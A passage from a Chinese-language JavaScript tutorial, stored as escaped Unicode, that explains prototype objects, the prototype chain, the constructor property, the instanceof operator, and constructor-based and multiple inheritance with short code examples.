\u5c5e\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u5b9e\u4f8b\u5bf9\u8c61\u672c\u8eab\u6ca1\u6709\u67d0\u4e2a\u5c5e\u6027\u6216\u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u5230\u539f\u578b\u5bf9\u8c61\u53bb\u5bfb\u627e\u8be5\u5c5e\u6027\u6216\u65b9\u6cd5\u3002\u8fd9\u5c31\u662f\u539f\u578b\u5bf9\u8c61\u7684\u7279\u6b8a\u4e4b\u5904\u3002 \u5982\u679c\u5b9e\u4f8b\u5bf9\u8c61\u81ea\u8eab\u5c31\u6709\u67d0\u4e2a\u5c5e\u6027\u6216\u65b9\u6cd5\uff0c\u5b83\u5c31\u4e0d\u4f1a\u518d\u53bb\u539f\u578b\u5bf9\u8c61\u5bfb\u627e\u8fd9\u4e2a\u5c5e\u6027\u6216\u65b9\u6cd5\u3002 1 2 3 4 5 cat1 . color = 'black' ; cat1 . color // 'black' cat2 . color // 'yellow' Animal . prototype . color // 'yellow'; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9e\u4f8b\u5bf9\u8c61 cat1 \u7684 color \u5c5e\u6027\u6539\u4e3a black \uff0c\u5c31\u4f7f\u5f97\u5b83\u4e0d\u518d\u53bb\u539f\u578b\u5bf9\u8c61\u8bfb\u53d6 color \u5c5e\u6027\uff0c\u540e\u8005\u7684\u503c\u4f9d\u7136\u4e3a yellow \u3002 \u603b\u7ed3\u4e00\u4e0b\uff0c\u539f\u578b\u5bf9\u8c61\u7684\u4f5c\u7528\uff0c\u5c31\u662f\u5b9a\u4e49\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\u5171\u4eab\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u8fd9\u4e5f\u662f\u5b83\u88ab\u79f0\u4e3a\u539f\u578b\u5bf9\u8c61\u7684\u539f\u56e0\uff0c\u800c\u5b9e\u4f8b\u5bf9\u8c61\u53ef\u4ee5\u89c6\u4f5c\u4ece\u539f\u578b\u5bf9\u8c61\u884d\u751f\u51fa\u6765\u7684\u5b50\u5bf9\u8c61\u3002 1 2 3 Animal . prototype . walk = function () { console . log ( this . name + ' is walking' ); }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Animal.prototype \u5bf9\u8c61\u4e0a\u9762\u5b9a\u4e49\u4e86\u4e00\u4e2a walk \u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u5c06\u53ef\u4ee5\u5728\u6240\u6709 Animal \u5b9e\u4f8b\u5bf9\u8c61\u4e0a\u9762\u8c03\u7528\u3002 \u539f\u578b\u94fe \u00b6 JavaScript \u89c4\u5b9a\uff0c\u6240\u6709\u5bf9\u8c61\u90fd\u6709\u81ea\u5df1\u7684\u539f\u578b\u5bf9\u8c61\uff08prototype\uff09\u3002\u4e00\u65b9\u9762\uff0c\u4efb\u4f55\u4e00\u4e2a\u5bf9\u8c61\uff0c\u90fd\u53ef\u4ee5\u5145\u5f53\u5176\u4ed6\u5bf9\u8c61\u7684\u539f\u578b\uff1b\u53e6\u4e00\u65b9\u9762\uff0c\u7531\u4e8e\u539f\u578b\u5bf9\u8c61\u4e5f\u662f\u5bf9\u8c61\uff0c\u6240\u4ee5\u5b83\u4e5f\u6709\u81ea\u5df1\u7684\u539f\u578b\u3002\u56e0\u6b64\uff0c\u5c31\u4f1a\u5f62\u6210\u4e00\u4e2a\u201c\u539f\u578b\u94fe\u201d\uff08prototype chain\uff09\uff1a\u5bf9\u8c61\u5230\u539f\u578b\uff0c\u518d\u5230\u539f\u578b\u7684\u539f\u578b\u2026\u2026 \u5982\u679c\u4e00\u5c42\u5c42\u5730\u4e0a\u6eaf\uff0c\u6240\u6709\u5bf9\u8c61\u7684\u539f\u578b\u6700\u7ec8\u90fd\u53ef\u4ee5\u4e0a\u6eaf\u5230 Object.prototype \uff0c\u5373 Object \u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6240\u6709\u5bf9\u8c61\u90fd\u7ee7\u627f\u4e86 Object.prototype \u7684\u5c5e\u6027\u3002\u8fd9\u5c31\u662f\u6240\u6709\u5bf9\u8c61\u90fd\u6709 valueOf \u548c toString \u65b9\u6cd5\u7684\u539f\u56e0\uff0c\u56e0\u4e3a\u8fd9\u662f\u4ece Object.prototype \u7ee7\u627f\u7684\u3002 \u90a3\u4e48\uff0c Object.prototype \u5bf9\u8c61\u6709\u6ca1\u6709\u5b83\u7684\u539f\u578b\u5462\uff1f\u56de\u7b54\u662f Object.prototype \u7684\u539f\u578b\u662f null \u3002 null \u6ca1\u6709\u4efb\u4f55\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u4e5f\u6ca1\u6709\u81ea\u5df1\u7684\u539f\u578b\u3002\u56e0\u6b64\uff0c\u539f\u578b\u94fe\u7684\u5c3d\u5934\u5c31\u662f null \u3002 1 2 Object . getPrototypeOf ( Object . prototype ) // null \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c Object.prototype \u5bf9\u8c61\u7684\u539f\u578b\u662f null \uff0c\u7531\u4e8e null \u6ca1\u6709\u4efb\u4f55\u5c5e\u6027\uff0c\u6240\u4ee5\u539f\u578b\u94fe\u5230\u6b64\u4e3a\u6b62\u3002 Object.getPrototypeOf \u65b9\u6cd5\u8fd4\u56de\u53c2\u6570\u5bf9\u8c61\u7684\u539f\u578b\uff0c\u5177\u4f53\u4ecb\u7ecd\u8bf7\u770b\u540e\u6587\u3002 \u8bfb\u53d6\u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\u65f6\uff0cJavaScript \u5f15\u64ce\u5148\u5bfb\u627e\u5bf9\u8c61\u672c\u8eab\u7684\u5c5e\u6027\uff0c\u5982\u679c\u627e\u4e0d\u5230\uff0c\u5c31\u5230\u5b83\u7684\u539f\u578b\u53bb\u627e\uff0c\u5982\u679c\u8fd8\u662f\u627e\u4e0d\u5230\uff0c\u5c31\u5230\u539f\u578b\u7684\u539f\u578b\u53bb\u627e\u3002\u5982\u679c\u76f4\u5230\u6700\u9876\u5c42\u7684 Object.prototype \u8fd8\u662f\u627e\u4e0d\u5230\uff0c\u5219\u8fd4\u56de undefined \u3002\u5982\u679c\u5bf9\u8c61\u81ea\u8eab\u548c\u5b83\u7684\u539f\u578b\uff0c\u90fd\u5b9a\u4e49\u4e86\u4e00\u4e2a\u540c\u540d\u5c5e\u6027\uff0c\u90a3\u4e48\u4f18\u5148\u8bfb\u53d6\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u8fd9\u53eb\u505a\u201c\u8986\u76d6\u201d\uff08overriding\uff09\u3002 \u6ce8\u610f\uff0c\u4e00\u7ea7\u7ea7\u5411\u4e0a\uff0c\u5728\u6574\u4e2a\u539f\u578b\u94fe\u4e0a\u5bfb\u627e\u67d0\u4e2a\u5c5e\u6027\uff0c\u5bf9\u6027\u80fd\u662f\u6709\u5f71\u54cd\u7684\u3002\u6240\u5bfb\u627e\u7684\u5c5e\u6027\u5728\u8d8a\u4e0a\u5c42\u7684\u539f\u578b\u5bf9\u8c61\uff0c\u5bf9\u6027\u80fd\u7684\u5f71\u54cd\u8d8a\u5927\u3002\u5982\u679c\u5bfb\u627e\u67d0\u4e2a\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\uff0c\u5c06\u4f1a\u904d\u5386\u6574\u4e2a\u539f\u578b\u94fe\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5982\u679c\u8ba9\u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027\u6307\u5411\u4e00\u4e2a\u6570\u7ec4\uff0c\u5c31\u610f\u5473\u7740\u5b9e\u4f8b\u5bf9\u8c61\u53ef\u4ee5\u8c03\u7528\u6570\u7ec4\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 var MyArray = function () {}; MyArray . prototype = new Array (); MyArray . prototype . constructor = MyArray ; var mine = new MyArray (); mine . push ( 1 , 2 , 3 ); mine . length // 3 mine instanceof Array // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c mine \u662f\u6784\u9020\u51fd\u6570 MyArray \u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u7531\u4e8e MyArray.prototype \u6307\u5411\u4e00\u4e2a\u6570\u7ec4\u5b9e\u4f8b\uff0c\u4f7f\u5f97 mine \u53ef\u4ee5\u8c03\u7528\u6570\u7ec4\u65b9\u6cd5\uff08\u8fd9\u4e9b\u65b9\u6cd5\u5b9a\u4e49\u5728\u6570\u7ec4\u5b9e\u4f8b\u7684 prototype \u5bf9\u8c61\u4e0a\u9762\uff09\u3002\u6700\u540e\u90a3\u884c instanceof \u8868\u8fbe\u5f0f\uff0c\u7528\u6765\u6bd4\u8f83\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u4e3a\u67d0\u4e2a\u6784\u9020\u51fd\u6570\u7684\u5b9e\u4f8b\uff0c\u7ed3\u679c\u5c31\u662f\u8bc1\u660e mine \u4e3a Array \u7684\u5b9e\u4f8b\uff0c instanceof \u8fd0\u7b97\u7b26\u7684\u8be6\u7ec6\u89e3\u91ca\u8be6\u89c1\u540e\u6587\u3002 \u4e0a\u9762\u4ee3\u7801\u8fd8\u51fa\u73b0\u4e86\u539f\u578b\u5bf9\u8c61\u7684 constructor \u5c5e\u6027\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7684\u542b\u4e49\u4e0b\u4e00\u8282\u5c31\u6765\u89e3\u91ca\u3002 constructor \u5c5e\u6027 \u00b6 prototype \u5bf9\u8c61\u6709\u4e00\u4e2a constructor \u5c5e\u6027\uff0c\u9ed8\u8ba4\u6307\u5411 prototype \u5bf9\u8c61\u6240\u5728\u7684\u6784\u9020\u51fd\u6570\u3002 1 2 function P () {} P . prototype . constructor === P // true \u7531\u4e8e constructor \u5c5e\u6027\u5b9a\u4e49\u5728 prototype \u5bf9\u8c61\u4e0a\u9762\uff0c\u610f\u5473\u7740\u53ef\u4ee5\u88ab\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\u7ee7\u627f\u3002 1 2 3 4 5 6 function P () {} var p = new P (); p . constructor === P // true p . constructor === P . prototype . constructor // true p . hasOwnProperty ( 'constructor' ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p \u662f\u6784\u9020\u51fd\u6570 P \u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u4f46\u662f p \u81ea\u8eab\u6ca1\u6709 constructor \u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u5176\u5b9e\u662f\u8bfb\u53d6\u539f\u578b\u94fe\u4e0a\u9762\u7684 P.prototype.constructor \u5c5e\u6027\u3002 constructor \u5c5e\u6027\u7684\u4f5c\u7528\u662f\uff0c\u53ef\u4ee5\u5f97\u77e5\u67d0\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u5230\u5e95\u662f\u54ea\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u4ea7\u751f\u7684\u3002 1 2 3 4 5 function F () {}; var f = new F (); f . constructor === F // true f . constructor === RegExp // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c constructor \u5c5e\u6027\u786e\u5b9a\u4e86\u5b9e\u4f8b\u5bf9\u8c61 f \u7684\u6784\u9020\u51fd\u6570\u662f F \uff0c\u800c\u4e0d\u662f RegExp \u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u6709\u4e86 constructor \u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u4ece\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u65b0\u5efa\u53e6\u4e00\u4e2a\u5b9e\u4f8b\u3002 1 2 3 4 5 function Constr () {} var x = new Constr (); var y = new x . constructor (); y instanceof Constr // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c x \u662f\u6784\u9020\u51fd\u6570 Constr \u7684\u5b9e\u4f8b\uff0c\u53ef\u4ee5\u4ece x.constructor \u95f4\u63a5\u8c03\u7528\u6784\u9020\u51fd\u6570\u3002\u8fd9\u4f7f\u5f97\u5728\u5b9e\u4f8b\u65b9\u6cd5\u4e2d\uff0c\u8c03\u7528\u81ea\u8eab\u7684\u6784\u9020\u51fd\u6570\u6210\u4e3a\u53ef\u80fd\u3002 1 2 3 Constr . prototype . createCopy = function () { return new this . constructor (); }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c createCopy \u65b9\u6cd5\u8c03\u7528\u6784\u9020\u51fd\u6570\uff0c\u65b0\u5efa\u53e6\u4e00\u4e2a\u5b9e\u4f8b\u3002 constructor \u5c5e\u6027\u8868\u793a\u539f\u578b\u5bf9\u8c61\u4e0e\u6784\u9020\u51fd\u6570\u4e4b\u95f4\u7684\u5173\u8054\u5173\u7cfb\uff0c\u5982\u679c\u4fee\u6539\u4e86\u539f\u578b\u5bf9\u8c61\uff0c\u4e00\u822c\u4f1a\u540c\u65f6\u4fee\u6539 constructor \u5c5e\u6027\uff0c\u9632\u6b62\u5f15\u7528\u7684\u65f6\u5019\u51fa\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 12 function Person ( name ) { this . name = name ; } Person . prototype . constructor === Person // true Person . prototype = { method : function () {} }; Person . prototype . constructor === Person // false Person . prototype . constructor === Object // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6784\u9020\u51fd\u6570 Person \u7684\u539f\u578b\u5bf9\u8c61\u6539\u6389\u4e86\uff0c\u4f46\u662f\u6ca1\u6709\u4fee\u6539 constructor \u5c5e\u6027\uff0c\u5bfc\u81f4\u8fd9\u4e2a\u5c5e\u6027\u4e0d\u518d\u6307\u5411 Person \u3002\u7531\u4e8e Person \u7684\u65b0\u539f\u578b\u662f\u4e00\u4e2a\u666e\u901a\u5bf9\u8c61\uff0c\u800c\u666e\u901a\u5bf9\u8c61\u7684 constructor \u5c5e\u6027\u6307\u5411 Object \u6784\u9020\u51fd\u6570\uff0c\u5bfc\u81f4 Person.prototype.constructor \u53d8\u6210\u4e86 Object \u3002 \u6240\u4ee5\uff0c\u4fee\u6539\u539f\u578b\u5bf9\u8c61\u65f6\uff0c\u4e00\u822c\u8981\u540c\u65f6\u4fee\u6539 constructor \u5c5e\u6027\u7684\u6307\u5411\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // \u574f\u7684\u5199\u6cd5 C . prototype = { method1 : function (...) { ... }, // ... }; // \u597d\u7684\u5199\u6cd5 C . prototype = { constructor : C , method1 : function (...) { ... }, // ... }; // \u66f4\u597d\u7684\u5199\u6cd5 C . prototype . method1 = function (...) { ... }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8981\u4e48\u5c06 constructor \u5c5e\u6027\u91cd\u65b0\u6307\u5411\u539f\u6765\u7684\u6784\u9020\u51fd\u6570\uff0c\u8981\u4e48\u53ea\u5728\u539f\u578b\u5bf9\u8c61\u4e0a\u6dfb\u52a0\u65b9\u6cd5\uff0c\u8fd9\u6837\u53ef\u4ee5\u4fdd\u8bc1 instanceof \u8fd0\u7b97\u7b26\u4e0d\u4f1a\u5931\u771f\u3002 \u5982\u679c\u4e0d\u80fd\u786e\u5b9a constructor \u5c5e\u6027\u662f\u4ec0\u4e48\u51fd\u6570\uff0c\u8fd8\u6709\u4e00\u4e2a\u529e\u6cd5\uff1a\u901a\u8fc7 name \u5c5e\u6027\uff0c\u4ece\u5b9e\u4f8b\u5f97\u5230\u6784\u9020\u51fd\u6570\u7684\u540d\u79f0\u3002 1 2 3 function Foo () {} var f = new Foo (); f . constructor . name // \"Foo\" instanceof \u8fd0\u7b97\u7b26 \u00b6 instanceof \u8fd0\u7b97\u7b26\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5bf9\u8c61\u662f\u5426\u4e3a\u67d0\u4e2a\u6784\u9020\u51fd\u6570\u7684\u5b9e\u4f8b\u3002 1 2 var v = new Vehicle (); v instanceof Vehicle // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 v \u662f\u6784\u9020\u51fd\u6570 Vehicle \u7684\u5b9e\u4f8b\uff0c\u6240\u4ee5\u8fd4\u56de true \u3002 instanceof \u8fd0\u7b97\u7b26\u7684\u5de6\u8fb9\u662f\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u53f3\u8fb9\u662f\u6784\u9020\u51fd\u6570\u3002\u5b83\u4f1a\u68c0\u67e5\u53f3\u8fb9\u6784\u9020\u51fd\u6570\u7684\u539f\u578b\u5bf9\u8c61\uff08prototype\uff09\uff0c\u662f\u5426\u5728\u5de6\u8fb9\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u4e0a\u3002\u56e0\u6b64\uff0c\u4e0b\u9762\u4e24\u79cd\u5199\u6cd5\u662f\u7b49\u4ef7\u7684\u3002 1 2 3 v instanceof Vehicle // \u7b49\u540c\u4e8e Vehicle . prototype . isPrototypeOf ( v ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Vehicle \u662f\u5bf9\u8c61 v \u7684\u6784\u9020\u51fd\u6570\uff0c\u5b83\u7684\u539f\u578b\u5bf9\u8c61\u662f Vehicle.prototype \uff0c isPrototypeOf() \u65b9\u6cd5\u662f JavaScript \u63d0\u4f9b\u7684\u539f\u751f\u65b9\u6cd5\uff0c\u7528\u4e8e\u68c0\u67e5\u67d0\u4e2a\u5bf9\u8c61\u662f\u5426\u4e3a\u53e6\u4e00\u4e2a\u5bf9\u8c61\u7684\u539f\u578b\uff0c\u8be6\u7ec6\u89e3\u91ca\u89c1\u540e\u6587\u3002 \u7531\u4e8e instanceof \u68c0\u67e5\u6574\u4e2a\u539f\u578b\u94fe\uff0c\u56e0\u6b64\u540c\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u53ef\u80fd\u4f1a\u5bf9\u591a\u4e2a\u6784\u9020\u51fd\u6570\u90fd\u8fd4\u56de true \u3002 1 2 3 var d = new Date (); d instanceof Date // true d instanceof Object // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c d \u540c\u65f6\u662f Date \u548c Object \u7684\u5b9e\u4f8b\uff0c\u56e0\u6b64\u5bf9\u8fd9\u4e24\u4e2a\u6784\u9020\u51fd\u6570\u90fd\u8fd4\u56de true \u3002 \u7531\u4e8e\u4efb\u610f\u5bf9\u8c61\uff08\u9664\u4e86 null \uff09\u90fd\u662f Object \u7684\u5b9e\u4f8b\uff0c\u6240\u4ee5 instanceof \u8fd0\u7b97\u7b26\u53ef\u4ee5\u5224\u65ad\u4e00\u4e2a\u503c\u662f\u5426\u4e3a\u975e null \u7684\u5bf9\u8c61\u3002 1 2 3 4 var obj = { foo : 123 }; obj instanceof Object // true null instanceof Object // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9664\u4e86 null \uff0c\u5176\u4ed6\u5bf9\u8c61\u7684 instanceOf Object \u7684\u8fd0\u7b97\u7ed3\u679c\u90fd\u662f true \u3002 instanceof \u7684\u539f\u7406\u662f\u68c0\u67e5\u53f3\u8fb9\u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027\uff0c\u662f\u5426\u5728\u5de6\u8fb9\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u4e0a\u3002\u6709\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5\uff0c\u5c31\u662f\u5de6\u8fb9\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u4e0a\uff0c\u53ea\u6709 null \u5bf9\u8c61\u3002\u8fd9\u65f6\uff0c instanceof \u5224\u65ad\u4f1a\u5931\u771f\u3002 1 2 3 var obj = Object . create ( null ); typeof obj // \"object\" obj instanceof Object // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.create(null) \u8fd4\u56de\u4e00\u4e2a\u65b0\u5bf9\u8c61 obj \uff0c\u5b83\u7684\u539f\u578b\u662f null \uff08 Object.create() \u7684\u8be6\u7ec6\u4ecb\u7ecd\u89c1\u540e\u6587\uff09\u3002\u53f3\u8fb9\u7684\u6784\u9020\u51fd\u6570 Object \u7684 prototype \u5c5e\u6027\uff0c\u4e0d\u5728\u5de6\u8fb9\u7684\u539f\u578b\u94fe\u4e0a\uff0c\u56e0\u6b64 instanceof \u5c31\u8ba4\u4e3a obj \u4e0d\u662f Object \u7684\u5b9e\u4f8b\u3002\u8fd9\u662f\u552f\u4e00\u7684 instanceof \u8fd0\u7b97\u7b26\u5224\u65ad\u4f1a\u5931\u771f\u7684\u60c5\u51b5\uff08\u4e00\u4e2a\u5bf9\u8c61\u7684\u539f\u578b\u662f null \uff09\u3002 instanceof \u8fd0\u7b97\u7b26\u7684\u4e00\u4e2a\u7528\u5904\uff0c\u662f\u5224\u65ad\u503c\u7684\u7c7b\u578b\u3002 1 2 3 4 var x = [ 1 , 2 , 3 ]; var y = {}; x instanceof Array // true y instanceof Object // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c instanceof \u8fd0\u7b97\u7b26\u5224\u65ad\uff0c\u53d8\u91cf x \u662f\u6570\u7ec4\uff0c\u53d8\u91cf y \u662f\u5bf9\u8c61\u3002 \u6ce8\u610f\uff0c instanceof \u8fd0\u7b97\u7b26\u53ea\u80fd\u7528\u4e8e\u5bf9\u8c61\uff0c\u4e0d\u9002\u7528\u539f\u59cb\u7c7b\u578b\u7684\u503c\u3002 1 2 var s = 'hello' ; s instanceof String // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32\u4e0d\u662f String \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff08\u56e0\u4e3a\u5b57\u7b26\u4e32\u4e0d\u662f\u5bf9\u8c61\uff09\uff0c\u6240\u4ee5\u8fd4\u56de false \u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e undefined \u548c null \uff0c instanceof \u8fd0\u7b97\u7b26\u603b\u662f\u8fd4\u56de false \u3002 1 2 undefined instanceof Object // false null instanceof Object // false \u5229\u7528 instanceof \u8fd0\u7b97\u7b26\uff0c\u8fd8\u53ef\u4ee5\u5de7\u5999\u5730\u89e3\u51b3\uff0c\u8c03\u7528\u6784\u9020\u51fd\u6570\u65f6\uff0c\u5fd8\u4e86\u52a0 new \u547d\u4ee4\u7684\u95ee\u9898\u3002 1 2 3 4 5 6 7 8 function Fubar ( foo , bar ) { if ( this instanceof Fubar ) { this . _foo = foo ; this . _bar = bar ; } else { return new Fubar ( foo , bar ); } } \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528 instanceof \u8fd0\u7b97\u7b26\uff0c\u5728\u51fd\u6570\u4f53\u5185\u90e8\u5224\u65ad this \u5173\u952e\u5b57\u662f\u5426\u4e3a\u6784\u9020\u51fd\u6570 Fubar \u7684\u5b9e\u4f8b\u3002\u5982\u679c\u4e0d\u662f\uff0c\u5c31\u8868\u660e\u5fd8\u4e86\u52a0 new \u547d\u4ee4\u3002 \u6784\u9020\u51fd\u6570\u7684\u7ee7\u627f \u00b6 \u8ba9\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u7ee7\u627f\u53e6\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u662f\u975e\u5e38\u5e38\u89c1\u7684\u9700\u6c42\u3002\u8fd9\u53ef\u4ee5\u5206\u6210\u4e24\u6b65\u5b9e\u73b0\u3002\u7b2c\u4e00\u6b65\u662f\u5728\u5b50\u7c7b\u7684\u6784\u9020\u51fd\u6570\u4e2d\uff0c\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\u3002 1 2 3 4 function Sub ( value ) { Super . call ( this ); this . prop = value ; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Sub \u662f\u5b50\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c this \u662f\u5b50\u7c7b\u7684\u5b9e\u4f8b\u3002\u5728\u5b9e\u4f8b\u4e0a\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570 Super \uff0c\u5c31\u4f1a\u8ba9\u5b50\u7c7b\u5b9e\u4f8b\u5177\u6709\u7236\u7c7b\u5b9e\u4f8b\u7684\u5c5e\u6027\u3002 \u7b2c\u4e8c\u6b65\uff0c\u662f\u8ba9\u5b50\u7c7b\u7684\u539f\u578b\u6307\u5411\u7236\u7c7b\u7684\u539f\u578b\uff0c\u8fd9\u6837\u5b50\u7c7b\u5c31\u53ef\u4ee5\u7ee7\u627f\u7236\u7c7b\u539f\u578b\u3002 1 2 3 Sub . prototype = Object . create ( Super . prototype ); Sub . prototype . constructor = Sub ; Sub . prototype . method = '...' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Sub.prototype \u662f\u5b50\u7c7b\u7684\u539f\u578b\uff0c\u8981\u5c06\u5b83\u8d4b\u503c\u4e3a Object.create(Super.prototype) \uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u7b49\u4e8e Super.prototype \u3002\u5426\u5219\u540e\u9762\u4e24\u884c\u5bf9 Sub.prototype \u7684\u64cd\u4f5c\uff0c\u4f1a\u8fde\u7236\u7c7b\u7684\u539f\u578b Super.prototype \u4e00\u8d77\u4fee\u6539\u6389\u3002 \u53e6\u5916\u4e00\u79cd\u5199\u6cd5\u662f Sub.prototype \u7b49\u4e8e\u4e00\u4e2a\u7236\u7c7b\u5b9e\u4f8b\u3002 1 Sub . prototype = new Super (); \u4e0a\u9762\u8fd9\u79cd\u5199\u6cd5\u4e5f\u6709\u7ee7\u627f\u7684\u6548\u679c\uff0c\u4f46\u662f\u5b50\u7c7b\u4f1a\u5177\u6709\u7236\u7c7b\u5b9e\u4f8b\u7684\u65b9\u6cd5\u3002\u6709\u65f6\uff0c\u8fd9\u53ef\u80fd\u4e0d\u662f\u6211\u4eec\u9700\u8981\u7684\uff0c\u6240\u4ee5\u4e0d\u63a8\u8350\u4f7f\u7528\u8fd9\u79cd\u5199\u6cd5\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a Shape \u6784\u9020\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 function Shape () { this . x = 0 ; this . y = 0 ; } Shape . prototype . move = function ( x , y ) { this . x += x ; this . y += y ; console . info ( 'Shape moved.' ); }; \u6211\u4eec\u9700\u8981\u8ba9 Rectangle \u6784\u9020\u51fd\u6570\u7ee7\u627f Shape \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // \u7b2c\u4e00\u6b65\uff0c\u5b50\u7c7b\u7ee7\u627f\u7236\u7c7b\u7684\u5b9e\u4f8b function Rectangle () { Shape . call ( this ); // \u8c03\u7528\u7236\u7c7b\u6784\u9020\u51fd\u6570 } // \u53e6\u4e00\u79cd\u5199\u6cd5 function Rectangle () { this . base = Shape ; this . base (); } // \u7b2c\u4e8c\u6b65\uff0c\u5b50\u7c7b\u7ee7\u627f\u7236\u7c7b\u7684\u539f\u578b Rectangle . prototype = Object . create ( Shape . prototype ); Rectangle . prototype . constructor = Rectangle ; \u91c7\u7528\u8fd9\u6837\u7684\u5199\u6cd5\u4ee5\u540e\uff0c instanceof \u8fd0\u7b97\u7b26\u4f1a\u5bf9\u5b50\u7c7b\u548c\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c\u90fd\u8fd4\u56de true \u3002 1 2 3 4 var rect = new Rectangle (); rect instanceof Rectangle // true rect instanceof Shape // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7c7b\u662f\u6574\u4f53\u7ee7\u627f\u7236\u7c7b\u3002\u6709\u65f6\u53ea\u9700\u8981\u5355\u4e2a\u65b9\u6cd5\u7684\u7ee7\u627f\uff0c\u8fd9\u65f6\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002 1 2 3 4 ClassB . prototype . print = function () { ClassA . prototype . print . call ( this ); // some code } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7c7b B \u7684 print \u65b9\u6cd5\u5148\u8c03\u7528\u7236\u7c7b A \u7684 print \u65b9\u6cd5\uff0c\u518d\u90e8\u7f72\u81ea\u5df1\u7684\u4ee3\u7801\u3002\u8fd9\u5c31\u7b49\u4e8e\u7ee7\u627f\u4e86\u7236\u7c7b A \u7684 print \u65b9\u6cd5\u3002 \u591a\u91cd\u7ee7\u627f \u00b6 JavaScript \u4e0d\u63d0\u4f9b\u591a\u91cd\u7ee7\u627f\u529f\u80fd\uff0c\u5373\u4e0d\u5141\u8bb8\u4e00\u4e2a\u5bf9\u8c61\u540c\u65f6\u7ee7\u627f\u591a\u4e2a\u5bf9\u8c61\u3002\u4f46\u662f\uff0c\u53ef\u4ee5\u901a\u8fc7\u53d8\u901a\u65b9\u6cd5\uff0c\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function M1 () { this . hello = 'hello' ; } function M2 () { this . world = 'world' ; } function S () { M1 . call ( this ); M2 . call ( this ); } // \u7ee7\u627f M1 S . prototype = Object . create ( M1 . prototype ); // \u7ee7\u627f\u94fe\u4e0a\u52a0\u5165 M2 Object . assign ( S . prototype , M2 . prototype ); // \u6307\u5b9a\u6784\u9020\u51fd\u6570 S . prototype . constructor = S ; var s = new S (); s . hello // 'hello' s . world // 'world' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7c7b S \u540c\u65f6\u7ee7\u627f\u4e86\u7236\u7c7b M1 \u548c M2 \u3002\u8fd9\u79cd\u6a21\u5f0f\u53c8\u79f0\u4e3a 